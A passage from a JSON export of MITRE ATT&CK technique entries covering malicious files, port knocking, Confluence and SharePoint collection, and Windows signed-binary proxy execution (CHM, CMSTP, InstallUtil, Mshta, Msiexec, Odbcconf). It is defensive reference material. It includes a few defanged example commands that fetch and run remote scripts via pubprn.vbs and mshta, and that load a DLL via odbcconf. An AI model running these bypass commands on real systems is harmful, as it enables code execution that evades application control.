    "technique_description": "<p>An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from <a href=\"https://attack.mitre.org/techniques/T1566/001\">Spearphishing Attachment</a>. Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may employ various forms of <a href=\"https://attack.mitre.org/techniques/T1036\">Masquerading</a> on the file to increase the likelihood that a user will open it.<!-- raw HTML omitted --><!-- raw HTML omitted -->While <a href=\"https://attack.mitre.org/techniques/T1204/002\">Malicious File</a> frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user’s desktop hoping that a user will click on it. This activity may also be seen shortly after <a href=\"https://attack.mitre.org/techniques/T1534\">Internal Spearphishing</a>.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--8868cb5b-d575-4a60-acb2-07d37389a2fd",
    "platform": "linux|macos|windows|network",
    "tid": "T1205.001",
    "technique": "Port Knocking",
    "tactic": "defense-evasion",
    "datasources": "netflow-enclave-netflow|packet-capture",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.<!-- raw HTML omitted --><!-- raw HTML omitted -->This technique has been observed to both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.<!-- raw HTML omitted --><!-- raw HTML omitted -->The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.</p>\n",
    "technique_references": [
      {
        "source_name": "Hartrell cd00r 2002",
        "url": "https://www.giac.org/paper/gcih/342/handle-cd00r-invisible-backdoor/103631",
        "description": "Hartrell, Greg. (2002, August). Get a handle on cd00r: The invisible backdoor. Retrieved October 13, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--8868cb5b-d575-4a60-acb2-07d37389a2fd",
    "platform": "linux|macos|windows|network",
    "tid": "T1205.001",
    "technique": "Port Knocking",
    "tactic": "persistence",
    "datasources": "netflow-enclave-netflow|packet-capture",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.<!-- raw HTML omitted --><!-- raw HTML omitted -->This technique has been observed to both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.<!-- raw HTML omitted --><!-- raw HTML omitted -->The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.</p>\n",
    "technique_references": [
      {
        "source_name": "Hartrell cd00r 2002",
        "url": "https://www.giac.org/paper/gcih/342/handle-cd00r-invisible-backdoor/103631",
        "description": "Hartrell, Greg. (2002, August). Get a handle on cd00r: The invisible backdoor. Retrieved October 13, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--8868cb5b-d575-4a60-acb2-07d37389a2fd",
    "platform": "linux|macos|windows|network",
    "tid": "T1205.001",
    "technique": "Port Knocking",
    "tactic": "command-and-control",
    "datasources": "netflow-enclave-netflow|packet-capture",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.<!-- raw HTML omitted --><!-- raw HTML omitted -->This technique has been observed to both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.<!-- raw HTML omitted --><!-- raw HTML omitted -->The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.</p>\n",
    "technique_references": [
      {
        "source_name": "Hartrell cd00r 2002",
        "url": "https://www.giac.org/paper/gcih/342/handle-cd00r-invisible-backdoor/103631",
        "description": "Hartrell, Greg. (2002, August). Get a handle on cd00r: The invisible backdoor. Retrieved October 13, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--7ad38ef1-381a-406d-872a-38b136eb5ecc",
    "platform": "saas",
    "tid": "T1213.001",
    "technique": "Confluence",
    "tactic": "collection",
    "datasources": "authentication-logs|third-party-application-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p><!-- raw HTML omitted -->Adversaries may leverage Confluence repositories to mine valuable information. Often found in development environments alongside Atlassian JIRA, Confluence is generally used to store development-related documentation, however, in general may contain more diverse categories of useful information, such as:<!-- raw HTML omitted --><!-- raw HTML omitted -->* Policies, procedures, and standards<!-- raw HTML omitted -->* Physical / logical network diagrams<!-- raw HTML omitted -->* System architecture diagrams<!-- raw HTML omitted -->* Technical system documentation<!-- raw HTML omitted -->* Testing / development credentials<!-- raw HTML omitted -->* Work / project schedules<!-- raw HTML omitted -->* Source code snippets<!-- raw HTML omitted -->* Links to network shares and other internal resources<!-- raw HTML omitted --></p>\n",
    "technique_references": [
      {
        "source_name": "Atlassian Confluence Logging",
        "url": "https://confluence.atlassian.com/confkb/how-to-enable-user-access-logging-182943.html",
        "description": "Atlassian. (2018, January 9). How to Enable User Access Logging. Retrieved April 4, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--0c4b4fda-9062-47da-98b9-ceae2dcf052a",
    "platform": "windows|office-365",
    "tid": "T1213.002",
    "technique": "Sharepoint",
    "tactic": "collection",
    "datasources": "application-logs|authentication-logs|office-365-audit-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may leverage the SharePoint repository as a source to mine valuable information. SharePoint will often contain useful information for an adversary to learn about the structure and functionality of the internal network and systems. For example, the following is a list of example information that may hold potential value to an adversary and may also be found on SharePoint:<!-- raw HTML omitted --><!-- raw HTML omitted -->* Policies, procedures, and standards<!-- raw HTML omitted -->* Physical / logical network diagrams<!-- raw HTML omitted -->* System architecture diagrams<!-- raw HTML omitted -->* Technical system documentation<!-- raw HTML omitted -->* Testing / development credentials<!-- raw HTML omitted -->* Work / project schedules<!-- raw HTML omitted -->* Source code snippets<!-- raw HTML omitted -->* Links to network shares and other internal resources<!-- raw HTML omitted --></p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft SharePoint Logging",
        "url": "https://support.office.com/en-us/article/configure-audit-settings-for-a-site-collection-a9920c97-38c0-44f2-8bcb-4cf1e2ae22d2",
        "description": "Microsoft. (2017, July 19). Configure audit settings for a site collection. Retrieved April 4, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--09cd431f-eaf4-4d2a-acaf-2a7acfe7ed58",
    "platform": "windows",
    "tid": "T1216.001",
    "technique": "PubPrn",
    "tactic": "defense-evasion",
    "datasources": "process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use the trusted PubPrn script to proxy execution of malicious files. This behavior may bypass signature validation restrictions and application control solutions that do not account for use of these scripts.<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->PubPrn.vbs<!-- raw HTML omitted --> is a Visual Basic script that publishes a printer to Active Directory Domain Services. The script is signed by Microsoft and can be used to proxy execution from a remote site.(Citation: Enigma0x3 PubPrn Bypass) An example command is <!-- raw HTML omitted -->cscript C[:]\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn[.]vbs 127.0.0.1 script:http[:]//192.168.1.100/hi.png<!-- raw HTML omitted -->.</p>\n",
    "technique_references": [
      {
        "source_name": "Enigma0x3 PubPrn Bypass",
        "url": "https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/",
        "description": "Nelson, M. (2017, August 3). WSH INJECTION: A CASE STUDY. Retrieved April 9, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--a6937325-9321-4e2e-bb2b-3ed2d40b2a9d",
    "platform": "windows",
    "tid": "T1218.001",
    "technique": "Compiled HTML File",
    "tactic": "defense-evasion",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse Compiled HTML files (.chm) to conceal malicious code. CHM files are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX. (Citation: Microsoft HTML Help May 2018) CHM content is displayed using underlying components of the Internet Explorer browser (Citation: Microsoft HTML Help ActiveX) loaded by the HTML Help executable program (hh.exe). (Citation: Microsoft HTML Help Executable Program)<!-- raw HTML omitted --><!-- raw HTML omitted -->A custom CHM file containing embedded payloads could be delivered to a victim then triggered by <a href=\"https://attack.mitre.org/techniques/T1204\">User Execution</a>. CHM execution may also bypass application application control on older and/or unpatched systems that do not account for execution of binaries through hh.exe. (Citation: MsitPros CHM Aug 2017) (Citation: Microsoft CVE-2017-8625 Aug 2017)</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft HTML Help May 2018",
        "url": "https://docs.microsoft.com/previous-versions/windows/desktop/htmlhelp/microsoft-html-help-1-4-sdk",
        "description": "Microsoft. (2018, May 30). Microsoft HTML Help 1.4. Retrieved October 3, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft HTML Help ActiveX",
        "url": "https://msdn.microsoft.com/windows/desktop/ms644670",
        "description": "Microsoft. (n.d.). HTML Help ActiveX Control Overview. Retrieved October 3, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft HTML Help Executable Program",
        "url": "https://msdn.microsoft.com/windows/desktop/ms524405",
        "description": "Microsoft. (n.d.). About the HTML Help Executable Program. Retrieved October 3, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "MsitPros CHM Aug 2017",
        "url": "https://msitpros.com/?p=3909",
        "description": "Moe, O. (2017, August 13). Bypassing Device guard UMCI using CHM – CVE-2017-8625. Retrieved October 3, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft CVE-2017-8625 Aug 2017",
        "url": "https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-8625",
        "description": "Microsoft. (2017, August 8). CVE-2017-8625 - Internet Explorer Security Feature Bypass Vulnerability. Retrieved October 3, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--4ff5d6a8-c062-4c68-a778-36fc5edd564f",
    "platform": "windows",
    "tid": "T1218.002",
    "technique": "Control Panel",
    "tactic": "defense-evasion",
    "datasources": "api-monitoring|binary-file-metadata|dll-monitoring|process-command-line-parameters|process-monitoring|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse control.exe to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings.<!-- raw HTML omitted --><!-- raw HTML omitted -->Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a <!-- raw HTML omitted -->CPlApplet<!-- raw HTML omitted --> function.(Citation: Microsoft Implementing CPL)(Citation: TrendMicro CPL Malware Jan 2014) For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel.(Citation: Microsoft Implementing CPL) Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file.(Citation: Microsoft Implementing CPL) (Citation: TrendMicro CPL Malware Jan 2014)(Citation: TrendMicro CPL Malware Dec 2013)<!-- raw HTML omitted --><!-- raw HTML omitted -->Malicious Control Panel items can be delivered via <a href=\"https://attack.mitre.org/techniques/T1566\">Phishing</a> campaigns(Citation: TrendMicro CPL Malware Jan 2014)(Citation: TrendMicro CPL Malware Dec 2013) or executed as part of multi-stage malware.(Citation: Palo Alto Reaver Nov 2017) Control Panel items, specifically CPL files, may also bypass application and/or file extension allow lists.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may also rename malicious DLL files (.dll) with Control Panel file extensions (.cpl) and register them to <!-- raw HTML omitted -->HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cpls<!-- raw HTML omitted -->. Even when these registered DLLs do not comply with the CPL file specification and do not export <!-- raw HTML omitted -->CPlApplet<!-- raw HTML omitted --> functions, they are loaded and executed through its <!-- raw HTML omitted -->DllEntryPoint<!-- raw HTML omitted --> when Control Panel is executed. CPL files not exporting <!-- raw HTML omitted -->CPlApplet<!-- raw HTML omitted --> are not directly executable.(Citation: ESET InvisiMole June 2020)</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft Implementing CPL",
        "url": "https://msdn.microsoft.com/library/windows/desktop/cc144185.aspx",
        "description": "M. (n.d.). Implementing Control Panel Items. Retrieved January 18, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "TrendMicro CPL Malware Jan 2014",
        "url": "https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf",
        "description": "Mercês, F. (2014, January 27). CPL Malware - Malicious Control Panel Items. Retrieved January 18, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "TrendMicro CPL Malware Dec 2013",
        "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/control-panel-files-used-as-malicious-attachments/",
        "description": "Bernardino, J. (2013, December 17). Control Panel Files Used As Malicious Attachments. Retrieved January 18, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Palo Alto Reaver Nov 2017",
        "url": "https://researchcenter.paloaltonetworks.com/2017/11/unit42-new-malware-with-ties-to-sunorcal-discovered/",
        "description": "Grunzweig, J. and Miller-Osborn, J. (2017, November 10). New Malware with Ties to SunOrcal Discovered. Retrieved November 16, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "ESET InvisiMole June 2020",
        "url": "https://www.welivesecurity.com/wp-content/uploads/2020/06/ESET_InvisiMole.pdf",
        "description": "Hromcova, Z. and Cherpanov, A. (2020, June). INVISIMOLE: THE HIDDEN PART OF THE STORY. Retrieved July 16, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--4cbc6a62-9e34-4f94-8a19-5c1a11392a49",
    "platform": "windows",
    "tid": "T1218.003",
    "technique": "CMSTP",
    "tactic": "defense-evasion",
    "datasources": "process-command-line-parameters|process-monitoring|process-use-of-network|windows-event-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. (Citation: Microsoft Connection Manager Oct 2009) CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may supply CMSTP.exe with INF files infected with malicious commands. (Citation: Twitter CMSTP Usage Jan 2018) Similar to <a href=\"https://attack.mitre.org/techniques/T1218/010\">Regsvr32</a> / ”Squiblydoo”, CMSTP.exe may be abused to load and execute DLLs (Citation: MSitPros CMSTP Aug 2017)  and/or COM scriptlets (SCT) from remote servers. (Citation: Twitter CMSTP Jan 2018) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018) This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate, signed Microsoft application.<!-- raw HTML omitted --><!-- raw HTML omitted -->CMSTP.exe can also be abused to <a href=\"https://attack.mitre.org/techniques/T1548/002\">Bypass User Account Control</a> and execute arbitrary commands from a malicious INF through an auto-elevated COM interface. (Citation: MSitPros CMSTP Aug 2017) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018)</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft Connection Manager Oct 2009",
        "url": "https://docs.microsoft.com/previous-versions/windows/it-pro/windows-server-2003/cc786431(v=ws.10)",
        "description": "Microsoft. (2009, October 8). How Connection Manager Works. Retrieved April 11, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Twitter CMSTP Usage Jan 2018",
        "url": "https://twitter.com/ItsReallyNick/status/958789644165894146",
        "description": "Carr, N. (2018, January 31). Here is some early bad cmstp.exe... Retrieved April 11, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "MSitPros CMSTP Aug 2017",
        "url": "https://msitpros.com/?p=3960",
        "description": "Moe, O. (2017, August 15). Research on CMSTP.exe. Retrieved April 11, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Twitter CMSTP Jan 2018",
        "url": "https://twitter.com/NickTyrer/status/958450014111633408",
        "description": "Tyrer, N. (2018, January 30). CMSTP.exe - remote .sct execution applocker bypass. Retrieved April 11, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub Ultimate AppLocker Bypass List",
        "url": "https://github.com/api0cradle/UltimateAppLockerByPassList",
        "description": "Moe, O. (2018, March 1). Ultimate AppLocker Bypass List. Retrieved April 10, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Endurant CMSTP July 2018",
        "url": "http://www.endurant.io/cmstp/detecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon/",
        "description": "Seetharaman, N. (2018, July 7). Detecting CMSTP-Enabled Code Execution and UAC Bypass With Sysmon.. Retrieved August 6, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--2cd950a6-16c4-404a-aa01-044322395107",
    "platform": "windows",
    "tid": "T1218.004",
    "technique": "InstallUtil",
    "tactic": "defense-evasion",
    "datasources": "process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. (Citation: MSDN InstallUtil) InstallUtil is digitally signed by Microsoft and located in the .NET directories on a Windows system: <!-- raw HTML omitted -->C:\\Windows\\Microsoft.NET\\Framework\\v<!-- raw HTML omitted -->\\InstallUtil.exe<!-- raw HTML omitted --> and <!-- raw HTML omitted -->C:\\Windows\\Microsoft.NET\\Framework64\\v<!-- raw HTML omitted -->\\InstallUtil.exe<!-- raw HTML omitted -->.<!-- raw HTML omitted --><!-- raw HTML omitted -->InstallUtil may also be used to bypass application control through use of attributes within the binary that execute the class decorated with the attribute <!-- raw HTML omitted -->[System.ComponentModel.RunInstaller(true)]<!-- raw HTML omitted -->. (Citation: LOLBAS Installutil)</p>\n",
    "technique_references": [
      {
        "source_name": "MSDN InstallUtil",
        "url": "https://msdn.microsoft.com/en-us/library/50614e95.aspx",
        "description": "Microsoft. (n.d.). Installutil.exe (Installer Tool). Retrieved July 1, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "LOLBAS Installutil",
        "url": "https://lolbas-project.github.io/lolbas/Binaries/Installutil/",
        "description": "LOLBAS. (n.d.). Installutil.exe. Retrieved July 31, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--840a987a-99bd-4a80-a5c9-0cb2baa6cade",
    "platform": "windows",
    "tid": "T1218.005",
    "technique": "Mshta",
    "tactic": "defense-evasion",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) <!-- raw HTML omitted --><!-- raw HTML omitted -->Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)<!-- raw HTML omitted --><!-- raw HTML omitted -->Files may be executed by mshta.exe through an inline script: <!-- raw HTML omitted -->mshta vbscript:Close(Execute(“GetObject(”“script:https[:]//webserver/payload[.]sct””)”))<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->They may also be executed directly from URLs: <!-- raw HTML omitted -->mshta http[:]//webserver/payload[.]hta<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->Mshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer’s security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)</p>\n",
    "technique_references": [
      {
        "source_name": "Cylance Dust Storm",
        "url": "https://www.cylance.com/content/dam/cylance/pdfs/reports/Op_Dust_Storm_Report.pdf",
        "description": "Gross, J. (2016, February 23). Operation Dust Storm. Retrieved September 19, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Red Canary HTA Abuse Part Deux",
        "url": "https://www.redcanary.com/blog/microsoft-html-application-hta-abuse-part-deux/",
        "description": "McCammon, K. (2015, August 14). Microsoft HTML Application (HTA) Abuse, Part Deux. Retrieved October 27, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye Attacks Leveraging HTA",
        "url": "https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html",
        "description": "Berry, A., Galang, L., Jiang, G., Leathery, J., Mohandas, R. (2017, April 11). CVE-2017-0199: In the Wild Attacks Leveraging HTA Handler. Retrieved October 27, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Airbus Security Kovter Analysis",
        "url": "https://airbus-cyber-security.com/fileless-malware-behavioural-analysis-kovter-persistence/",
        "description": "Dove, A. (2016, March 23). Fileless Malware – A Behavioural Analysis Of Kovter Persistence. Retrieved December 5, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye FIN7 April 2017",
        "url": "https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html",
        "description": "Carr, N., et al. (2017, April 24). FIN7 Evolution and the Phishing LNK. Retrieved April 24, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Wikipedia HTML Application",
        "url": "https://en.wikipedia.org/wiki/HTML_Application",
        "description": "Wikipedia. (2017, October 14). HTML Application. Retrieved October 27, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "MSDN HTML Applications",
        "url": "https://msdn.microsoft.com/library/ms536471.aspx",
        "description": "Microsoft. (n.d.). HTML Applications. Retrieved October 27, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "LOLBAS Mshta",
        "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
        "description": "LOLBAS. (n.d.). Mshta.exe. Retrieved July 31, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--365be77f-fc0e-42ee-bac8-4faf806d9336",
    "platform": "windows",
    "tid": "T1218.007",
    "technique": "Msiexec",
    "tactic": "defense-evasion",
    "datasources": "dll-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi).(Citation: Microsoft msiexec) Msiexec.exe is digitally signed by Microsoft.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs.(Citation: LOLBAS Msiexec)(Citation: TrendMicro Msiexec Feb 2018) Since it is signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse.</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft msiexec",
        "url": "https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec",
        "description": "Microsoft. (2017, October 15). msiexec. Retrieved January 24, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "LOLBAS Msiexec",
        "url": "https://lolbas-project.github.io/lolbas/Binaries/Msiexec/",
        "description": "LOLBAS. (n.d.). Msiexec.exe. Retrieved April 18, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "TrendMicro Msiexec Feb 2018",
        "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/attack-using-windows-installer-msiexec-exe-leads-lokibot/",
        "description": "Co, M. and Sison, G. (2018, February 8). Attack Using Windows Installer msiexec.exe leads to LokiBot. Retrieved April 18, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--6e3bd510-6b33-41a4-af80-2d80f3ee0071",
    "platform": "windows",
    "tid": "T1218.008",
    "technique": "Odbcconf",
    "tactic": "defense-evasion",
    "datasources": "loaded-dlls|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names.(Citation: Microsoft odbcconf.exe) Odbcconf.exe is digitally signed by Microsoft.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse. Similar to <a href=\"https://attack.mitre.org/techniques/T1218/010\">Regsvr32</a>, odbcconf.exe has a <!-- raw HTML omitted -->REGSVR<!-- raw HTML omitted --> flag that can be misused to execute DLLs (ex: <!-- raw HTML omitted -->odbcconf.exe /S /A {REGSVR “C:\\Users\\Public\\file.dll”}<!-- raw HTML omitted -->). (Citation: LOLBAS Odbcconf)(Citation: TrendMicro Squiblydoo Aug 2017)(Citation: TrendMicro Cobalt Group Nov 2017) <!-- raw HTML omitted --></p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft odbcconf.exe",
        "url": "https://docs.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-2017",
        "description": "Microsoft. (2017, January 18). ODBCCONF.EXE. Retrieved March 7, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "LOLBAS Odbcconf",
        "url": "https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/",
        "description": "LOLBAS. (n.d.). Odbcconf.exe. Retrieved March 7, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "TrendMicro Squiblydoo Aug 2017",
        "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/backdoor-carrying-emails-set-sights-on-russian-speaking-businesses/",
        "description": "Bermejo, L., Giagone, R., Wu, R., and Yarochkin, F. (2017, August 7). Backdoor-carrying Emails Set Sights on Russian-speaking Businesses. Retrieved March 7, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "TrendMicro Cobalt Group Nov 2017",
        "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/cobalt-spam-runs-use-macros-cve-2017-8759-exploit/",
        "description": "Giagone, R., Bermejo, L., and Yarochkin, F. (2017, November 20). Cobalt Strikes Again: Spam Runs Use Macros and CVE-2017-8759 Exploit Against Russian Banks. Retrieved March 7, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
